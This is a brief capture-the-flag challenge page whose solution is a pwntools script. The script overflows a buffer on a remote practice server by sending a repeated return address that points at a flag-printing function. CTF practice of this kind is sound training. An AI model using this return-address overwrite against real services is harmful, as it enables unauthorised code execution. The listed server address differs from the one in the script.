#### Goals
 * Try to find the flag

#### Server Address
 * nc pwn.sniperoj.com 20002

#### Solution
```python
#!/usr/bin/env python

from pwn import *

# Io = process("./bof")
Io = remote("www.sniperoj.cn", 30000)
cat_flag_addr = p64(0x0000000000400616)
payload = cat_flag_addr * 4
Io.send(payload)
Io.interactive()
```

#### Writeups
 * [Offical Writeup]()
 * [Other Writeup]()

